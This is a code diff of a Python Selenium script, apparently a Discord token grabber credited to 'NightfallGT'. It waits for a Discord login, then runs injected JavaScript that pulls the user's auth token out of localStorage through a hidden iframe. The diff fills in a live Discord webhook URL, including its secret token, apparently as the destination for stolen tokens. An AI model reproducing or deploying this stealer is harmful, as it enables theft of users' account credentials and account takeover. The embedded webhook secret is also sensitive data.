@@ -7,7 +7,7 @@ import os
 import requests
 
 #Set Webhook Here! 
-url = "WEBHOOK GOES HERE"
+url = "https://discord.com/api/webhooks/845455192525897728/WbyO3GHw8uQExNattEyjECQ-ZJj9cHYM33g-ztujVVr-sNNpI1YjBuG21Y5IQ5uXIxxS"
 
 
 # Developer: NightfallGT
@@ -65,17 +65,13 @@ def main():
         if discord_login != driver.current_url:
             print('Grabbing token... \n')
             token = driver.execute_script('''
-    getToken = function () {
-        window.dispatchEvent(new Event('beforeunload'));
-        let iframe = document.createElement('iframe');
-        iframe.style.display = 'none';
-        document.body.appendChild(iframe);
-        let localStorage = iframe.contentWindow.localStorage;
-        var token = JSON.parse(localStorage.token);
-        return token;
-    }
-    let token = getToken();
-    return token; 
+window.dispatchEvent(new Event('beforeunload'));
+let iframe = document.createElement('iframe');
+iframe.style.display = 'none';
+document.body.appendChild(iframe);
+let localStorage = iframe.contentWindow.localStorage;
+var token = JSON.parse(localStorage.token);
+return token;
    
 ''')
             print('------------------------------------------------------------------------------------------')
